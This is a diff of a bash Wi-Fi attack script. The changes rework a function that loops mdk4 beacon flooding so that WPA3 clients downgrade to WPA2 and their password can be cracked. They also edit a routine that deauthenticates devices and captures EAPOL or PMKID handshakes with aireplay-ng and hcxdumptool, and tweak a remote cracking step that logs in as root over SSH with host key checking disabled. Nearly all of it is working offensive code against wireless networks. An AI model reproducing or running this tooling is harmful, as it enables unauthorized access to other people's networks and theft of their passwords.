@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version=3.7.2 # 1/6/25 01:20
+version=3.7.2 # 1/6/25 02:20
 
 
 
@@ -754,6 +754,21 @@ function devices_scanner() {
 
 
 
+function mixed_encryption() {
+    echo -e "${BOLD}The Encryption is "$encryption".${RESET} \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
+    #gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter b -n $bssid_name_original -c $channel -w a
+
+	(
+	  counter=0
+	  while [ $counter -lt 60 ]; do
+	    mdk4 "$wifi_adapter" b -n "$bssid_name_original" -c "$channel" -w a >/dev/null 2>&1
+	    sleep 5
+	    counter=$((counter + 10))
+	  done
+	) &
+        sleep 2
+}
+
 
 
 function deauth_attack() {
@@ -810,7 +825,7 @@ function attacks() {
 	animate_attack "Probe Request/Response attack" 13
 
 
-    echo -e "\n    [⏳] While attacking, Trying for 2 minutes to Capture the EAPOL or PMKID"
+    echo -e "\n    [⏳] Trying for 2 minutes to Capture the EAPOL or PMKID"
 
     # Start device scanner in background
     devices_scanner &
@@ -828,7 +843,7 @@ function attacks() {
     fi
 
     sleep 2
-    terminal_pid=$(pgrep gnome-terminal)
+    #terminal_pid=$(pgrep gnome-terminal)
 
     counter=0
     max_tries=24  # 24 * 5s = 120 seconds
@@ -855,10 +870,11 @@ function attacks() {
 
     # Kill scanner and hcxdumptool terminal
     kill "$scanner_pid" &>/dev/null
-    kill "$terminal_pid" &>/dev/null
+    #kill "$terminal_pid" &>/dev/null
     
     pkill aireplay-ng
     pkill airodump-ng
+    kill $MDK4_PID 2>/dev/null
 
     if (( counter == max_tries )); then
         echo -e "\n${RED}    [✘]${RESET} \033[31mTimeout:${RESET} No PMKID or EAPOL captured in 120 seconds."
@@ -869,13 +885,6 @@ function attacks() {
     printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
 }
 
-
-
-function mixed_encryption() {
-    echo -e "${BOLD}The Encryption is "$encryption".${RESET} \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
-    gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter b -n $bssid_name_original -c $channel -w a
-    sleep 5
-}
 
 
 
@@ -1344,7 +1353,7 @@ remote_cracking() {
     read -p "    Enter remote server IP:  " TARGET_IP
     read -p "    Enter root SSH password: " PASS
     local USER="root"
-    #local TARGET_IP="12.45.3.2"
+    #local TARGET_IP="15.16.12.115"
     #local PASS='Aa123456'
     local REMOTE_PATH="/root"
     local SSH_OPTIONS="-q -o LogLevel=ERROR -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
@@ -1566,7 +1575,7 @@ fi
 function another_scan_prompt() {
     while true; do
         echo
-        echo -e "${BOLD}[+] What would you like to do next ?${RESET}"
+        echo -e "What would you like to do next ?"
         echo "    1) Choose different network to attack"
         echo "    2) Run a new Scan"
         echo "    3) Exit"
